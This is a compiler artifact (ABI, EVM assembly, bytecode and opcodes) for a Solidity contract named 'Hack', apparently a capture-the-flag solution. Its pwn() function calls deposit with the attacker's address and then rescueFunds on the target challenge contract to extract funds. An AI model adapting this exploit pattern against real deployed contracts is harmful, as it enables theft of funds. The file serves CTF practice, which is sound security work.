{
	"contracts/BlockHeadersCTF.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract BlockHeadersCTF",
							"name": "_blockHeadersCTF",
							"type": "address"
						}
					],
					"stateMutability": "payable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "blockHeadersCTF",
					"outputs": [
						{
							"internalType": "contract BlockHeadersCTF",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "feeBps",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "pwn",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/BlockHeadersCTF.sol\":58:702  contract Hack {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/BlockHeadersCTF.sol\":250:254  3141 */\n  0x0c45\n    /* \"contracts/BlockHeadersCTF.sol\":226:254  uint256 public feeBps = 3141 */\n  0x03\n  sstore\n    /* \"contracts/BlockHeadersCTF.sol\":282:289  1 ether */\n  0x0de0b6b3a7640000\n    /* \"contracts/BlockHeadersCTF.sol\":260:289  uint256 donationBps = 1 ether */\n  0x04\n  sstore\n    /* \"contracts/BlockHeadersCTF.sol\":422:519  constructor (BlockHeadersCTF  _blockHeadersCTF) payable {... */\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_1\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n    /* \"contracts/BlockHeadersCTF.sol\":501:511  msg.sender */\n  caller\n    /* \"contracts/BlockHeadersCTF.sol\":488:498  hackerAddr */\n  0x01\n  0x00\n    /* \"contracts/BlockHeadersCTF.sol\":488:511  hackerAddr = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/BlockHeadersCTF.sol\":422:519  constructor (BlockHeadersCTF  _blockHeadersCTF) payable {... */\n  pop\n    /* \"contracts/BlockHeadersCTF.sol\":58:702  contract Hack {... */\n  jump(tag_5)\n    /* \"#utility.yul\":88:205   */\ntag_7:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_9:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:570   */\ntag_10:\n    /* \"#utility.yul\":511:518   */\n  0x00\n    /* \"#utility.yul\":540:564   */\n  tag_20\n    /* \"#utility.yul\":558:563   */\n  dup3\n    /* \"#utility.yul\":540:564   */\n  tag_9\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":529:564   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:570   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":576:703   */\ntag_11:\n    /* \"#utility.yul\":636:643   */\n  0x00\n    /* \"#utility.yul\":665:697   */\n  tag_22\n    /* \"#utility.yul\":691:696   */\n  dup3\n    /* \"#utility.yul\":665:697   */\n  tag_10\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":654:697   */\n  swap1\n  pop\n    /* \"#utility.yul\":576:703   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":709:877   */\ntag_12:\n    /* \"#utility.yul\":805:852   */\n  tag_24\n    /* \"#utility.yul\":846:851   */\n  dup2\n    /* \"#utility.yul\":805:852   */\n  tag_11\n  jump\t// in\ntag_24:\n    /* \"#utility.yul\":798:803   */\n  dup2\n    /* \"#utility.yul\":795:853   */\n  eq\n    /* \"#utility.yul\":785:871   */\n  tag_25\n  jumpi\n    /* \"#utility.yul\":867:868   */\n  0x00\n    /* \"#utility.yul\":864:865   */\n  0x00\n    /* \"#utility.yul\":857:869   */\n  revert\n    /* \"#utility.yul\":785:871   */\ntag_25:\n    /* \"#utility.yul\":709:877   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":883:1072   */\ntag_13:\n    /* \"#utility.yul\":963:968   */\n  0x00\n    /* \"#utility.yul\":994:1000   */\n  dup2\n    /* \"#utility.yul\":988:1001   */\n  mload\n    /* \"#utility.yul\":979:1001   */\n  swap1\n  pop\n    /* \"#utility.yul\":1010:1066   */\n  tag_27\n    /* \"#utility.yul\":1060:1065   */\n  dup2\n    /* \"#utility.yul\":1010:1066   */\n  tag_12\n  jump\t// in\ntag_27:\n    /* \"#utility.yul\":883:1072   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1078:1475   */\ntag_2:\n    /* \"#utility.yul\":1171:1177   */\n  0x00\n    /* \"#utility.yul\":1220:1222   */\n  0x20\n    /* \"#utility.yul\":1208:1217   */\n  dup3\n    /* \"#utility.yul\":1199:1206   */\n  dup5\n    /* \"#utility.yul\":1195:1218   */\n  sub\n    /* \"#utility.yul\":1191:1223   */\n  slt\n    /* \"#utility.yul\":1188:1307   */\n  iszero\n  tag_29\n  jumpi\n    /* \"#utility.yul\":1226:1305   */\n  tag_30\n  tag_7\n  jump\t// in\ntag_30:\n    /* \"#utility.yul\":1188:1307   */\ntag_29:\n    /* \"#utility.yul\":1346:1347   */\n  0x00\n    /* \"#utility.yul\":1371:1458   */\n  tag_31\n    /* \"#utility.yul\":1450:1457   */\n  dup5\n    /* \"#utility.yul\":1441:1447   */\n  dup3\n    /* \"#utility.yul\":1430:1439   */\n  dup6\n    /* \"#utility.yul\":1426:1448   */\n  add\n    /* \"#utility.yul\":1371:1458   */\n  tag_13\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1361:1458   */\n  swap2\n  pop\n    /* \"#utility.yul\":1317:1468   */\n  pop\n    /* \"#utility.yul\":1078:1475   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/BlockHeadersCTF.sol\":58:702  contract Hack {... */\ntag_5:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/BlockHeadersCTF.sol\":58:702  contract Hack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x24a9d853\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x7466346d\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xdd365b8b\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contracts/BlockHeadersCTF.sol\":226:254  uint256 public feeBps = 3141 */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_8\n      jumpi\n      revert(0x00, 0x00)\n    tag_8:\n      pop\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/BlockHeadersCTF.sol\":77:115  BlockHeadersCTF public blockHeadersCTF */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_13\n      jumpi\n      revert(0x00, 0x00)\n    tag_13:\n      pop\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/BlockHeadersCTF.sol\":526:654  function pwn() external {... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_18\n      jumpi\n      revert(0x00, 0x00)\n    tag_18:\n      pop\n      tag_19\n      tag_20\n      jump\t// in\n    tag_19:\n      stop\n        /* \"contracts/BlockHeadersCTF.sol\":226:254  uint256 public feeBps = 3141 */\n    tag_10:\n      sload(0x03)\n      dup2\n      jump\t// out\n        /* \"contracts/BlockHeadersCTF.sol\":77:115  BlockHeadersCTF public blockHeadersCTF */\n    tag_15:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/BlockHeadersCTF.sol\":526:654  function pwn() external {... */\n    tag_20:\n        /* \"contracts/BlockHeadersCTF.sol\":560:575  blockHeadersCTF */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/BlockHeadersCTF.sol\":560:583  blockHeadersCTF.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x47e7ef24\n        /* \"contracts/BlockHeadersCTF.sol\":584:594  hackerAddr */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/BlockHeadersCTF.sol\":596:607  donationBps */\n      sload(0x04)\n        /* \"contracts/BlockHeadersCTF.sol\":560:608  blockHeadersCTF.deposit(hackerAddr, donationBps) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_22\n      swap3\n      swap2\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      revert(0x00, 0x00)\n    tag_24:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_26\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_26:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/BlockHeadersCTF.sol\":619:634  blockHeadersCTF */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/BlockHeadersCTF.sol\":619:646  blockHeadersCTF.rescueFunds */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xe6b2603b\n        /* \"contracts/BlockHeadersCTF.sol\":619:648  blockHeadersCTF.rescueFunds() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      revert(0x00, 0x00)\n    tag_27:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_29:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/BlockHeadersCTF.sol\":526:654  function pwn() external {... */\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_30:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_31:\n        /* \"#utility.yul\":177:201   */\n      tag_43\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_30\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_12:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_45\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_31\n      jump\t// in\n    tag_45:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":442:568   */\n    tag_32:\n        /* \"#utility.yul\":479:486   */\n      0x00\n        /* \"#utility.yul\":519:561   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":512:517   */\n      dup3\n        /* \"#utility.yul\":508:562   */\n      and\n        /* \"#utility.yul\":497:562   */\n      swap1\n      pop\n        /* \"#utility.yul\":442:568   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":574:634   */\n    tag_33:\n        /* \"#utility.yul\":602:605   */\n      0x00\n        /* \"#utility.yul\":623:628   */\n      dup2\n        /* \"#utility.yul\":616:628   */\n      swap1\n      pop\n        /* \"#utility.yul\":574:634   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":640:782   */\n    tag_34:\n        /* \"#utility.yul\":690:699   */\n      0x00\n        /* \"#utility.yul\":723:776   */\n      tag_49\n        /* \"#utility.yul\":741:775   */\n      tag_50\n        /* \"#utility.yul\":750:774   */\n      tag_51\n        /* \"#utility.yul\":768:773   */\n      dup5\n        /* \"#utility.yul\":750:774   */\n      tag_32\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":741:775   */\n      tag_33\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":723:776   */\n      tag_32\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":710:776   */\n      swap1\n      pop\n        /* \"#utility.yul\":640:782   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":788:922   */\n    tag_35:\n        /* \"#utility.yul\":846:855   */\n      0x00\n        /* \"#utility.yul\":879:916   */\n      tag_53\n        /* \"#utility.yul\":910:915   */\n      dup3\n        /* \"#utility.yul\":879:916   */\n      tag_34\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":866:916   */\n      swap1\n      pop\n        /* \"#utility.yul\":788:922   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":928:1093   */\n    tag_36:\n        /* \"#utility.yul\":1009:1018   */\n      0x00\n        /* \"#utility.yul\":1042:1087   */\n      tag_55\n        /* \"#utility.yul\":1081:1086   */\n      dup3\n        /* \"#utility.yul\":1042:1087   */\n      tag_35\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1029:1087   */\n      swap1\n      pop\n        /* \"#utility.yul\":928:1093   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1099:1292   */\n    tag_37:\n        /* \"#utility.yul\":1217:1285   */\n      tag_57\n        /* \"#utility.yul\":1279:1284   */\n      dup2\n        /* \"#utility.yul\":1217:1285   */\n      tag_36\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":1212:1215   */\n      dup3\n        /* \"#utility.yul\":1205:1286   */\n      mstore\n        /* \"#utility.yul\":1099:1292   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1298:1582   */\n    tag_17:\n        /* \"#utility.yul\":1422:1426   */\n      0x00\n        /* \"#utility.yul\":1460:1462   */\n      0x20\n        /* \"#utility.yul\":1449:1458   */\n      dup3\n        /* \"#utility.yul\":1445:1463   */\n      add\n        /* \"#utility.yul\":1437:1463   */\n      swap1\n      pop\n        /* \"#utility.yul\":1473:1575   */\n      tag_59\n        /* \"#utility.yul\":1572:1573   */\n      0x00\n        /* \"#utility.yul\":1561:1570   */\n      dup4\n        /* \"#utility.yul\":1557:1574   */\n      add\n        /* \"#utility.yul\":1548:1554   */\n      dup5\n        /* \"#utility.yul\":1473:1575   */\n      tag_37\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1298:1582   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1588:1684   */\n    tag_38:\n        /* \"#utility.yul\":1625:1632   */\n      0x00\n        /* \"#utility.yul\":1654:1678   */\n      tag_61\n        /* \"#utility.yul\":1672:1677   */\n      dup3\n        /* \"#utility.yul\":1654:1678   */\n      tag_32\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1643:1678   */\n      swap1\n      pop\n        /* \"#utility.yul\":1588:1684   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1690:1808   */\n    tag_39:\n        /* \"#utility.yul\":1777:1801   */\n      tag_63\n        /* \"#utility.yul\":1795:1800   */\n      dup2\n        /* \"#utility.yul\":1777:1801   */\n      tag_38\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":1772:1775   */\n      dup3\n        /* \"#utility.yul\":1765:1802   */\n      mstore\n        /* \"#utility.yul\":1690:1808   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1814:2146   */\n    tag_23:\n        /* \"#utility.yul\":1935:1939   */\n      0x00\n        /* \"#utility.yul\":1973:1975   */\n      0x40\n        /* \"#utility.yul\":1962:1971   */\n      dup3\n        /* \"#utility.yul\":1958:1976   */\n      add\n        /* \"#utility.yul\":1950:1976   */\n      swap1\n      pop\n        /* \"#utility.yul\":1986:2057   */\n      tag_65\n        /* \"#utility.yul\":2054:2055   */\n      0x00\n        /* \"#utility.yul\":2043:2052   */\n      dup4\n        /* \"#utility.yul\":2039:2056   */\n      add\n        /* \"#utility.yul\":2030:2036   */\n      dup6\n        /* \"#utility.yul\":1986:2057   */\n      tag_39\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":2067:2139   */\n      tag_66\n        /* \"#utility.yul\":2135:2137   */\n      0x20\n        /* \"#utility.yul\":2124:2133   */\n      dup4\n        /* \"#utility.yul\":2120:2138   */\n      add\n        /* \"#utility.yul\":2111:2117   */\n      dup5\n        /* \"#utility.yul\":2067:2139   */\n      tag_31\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":1814:2146   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220995ea95bc2de4b65593d24151a7997568ecfbdb26b71a6fb61f324adc51e8f9b64736f6c634300081b0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052610c45600355670de0b6b3a7640000600455604051610463380380610463833981810160405281019061003791906100ec565b3360015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610117565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100aa82610081565b9050919050565b5f6100bb826100a0565b9050919050565b6100cb816100b1565b81146100d5575f5ffd5b50565b5f815190506100e6816100c2565b92915050565b5f602082840312156101015761010061007d565b5b5f61010e848285016100d8565b91505092915050565b61033f806101245f395ff3fe608060405260043610610037575f3560e01c806324a9d853146100425780637466346d1461006c578063dd365b8b146100965761003e565b3661003e57005b5f5ffd5b34801561004d575f5ffd5b506100566100ac565b6040516100639190610216565b60405180910390f35b348015610077575f5ffd5b506100806100b2565b60405161008d91906102a9565b60405180910390f35b3480156100a1575f5ffd5b506100aa6100d6565b005b60035481565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166347e7ef2460015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff166004546040518363ffffffff1660e01b81526004016101549291906102e2565b5f604051808303815f87803b15801561016b575f5ffd5b505af115801561017d573d5f5f3e3d5ffd5b505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e6b2603b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156101e6575f5ffd5b505af11580156101f8573d5f5f3e3d5ffd5b50505050565b5f819050919050565b610210816101fe565b82525050565b5f6020820190506102295f830184610207565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61027161026c6102678461022f565b61024e565b61022f565b9050919050565b5f61028282610257565b9050919050565b5f61029382610278565b9050919050565b6102a381610289565b82525050565b5f6020820190506102bc5f83018461029a565b92915050565b5f6102cc8261022f565b9050919050565b6102dc816102c2565b82525050565b5f6040820190506102f55f8301856102d3565b6103026020830184610207565b939250505056fea2646970667358221220995ea95bc2de4b65593d24151a7997568ecfbdb26b71a6fb61f324adc51e8f9b64736f6c634300081b0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH2 0xC45 PUSH1 0x3 SSTORE PUSH8 0xDE0B6B3A7640000 PUSH1 0x4 SSTORE PUSH1 0x40 MLOAD PUSH2 0x463 CODESIZE SUB DUP1 PUSH2 0x463 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x37 SWAP2 SWAP1 PUSH2 0xEC JUMP JUMPDEST CALLER PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x117 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xAA DUP3 PUSH2 0x81 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xBB DUP3 PUSH2 0xA0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xCB DUP2 PUSH2 0xB1 JUMP JUMPDEST DUP2 EQ PUSH2 0xD5 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xE6 DUP2 PUSH2 0xC2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x101 JUMPI PUSH2 0x100 PUSH2 0x7D JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x10E DUP5 DUP3 DUP6 ADD PUSH2 0xD8 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x33F DUP1 PUSH2 0x124 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x24A9D853 EQ PUSH2 0x42 JUMPI DUP1 PUSH4 0x7466346D EQ PUSH2 0x6C JUMPI DUP1 PUSH4 0xDD365B8B EQ PUSH2 0x96 JUMPI PUSH2 0x3E JUMP JUMPDEST CALLDATASIZE PUSH2 0x3E JUMPI STOP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x4D JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x56 PUSH2 0xAC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x63 SWAP2 SWAP1 PUSH2 0x216 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x77 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x80 PUSH2 0xB2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x8D SWAP2 SWAP1 PUSH2 0x2A9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xA1 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0xAA PUSH2 0xD6 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x3 SLOAD DUP2 JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x47E7EF24 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x4 SLOAD PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x154 SWAP3 SWAP2 SWAP1 PUSH2 0x2E2 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x16B JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x17D JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE6B2603B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1E6 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1F8 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x210 DUP2 PUSH2 0x1FE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x229 PUSH0 DUP4 ADD DUP5 PUSH2 0x207 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x271 PUSH2 0x26C PUSH2 0x267 DUP5 PUSH2 0x22F JUMP JUMPDEST PUSH2 0x24E JUMP JUMPDEST PUSH2 0x22F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x282 DUP3 PUSH2 0x257 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x293 DUP3 PUSH2 0x278 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2A3 DUP2 PUSH2 0x289 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2BC PUSH0 DUP4 ADD DUP5 PUSH2 0x29A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x2CC DUP3 PUSH2 0x22F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 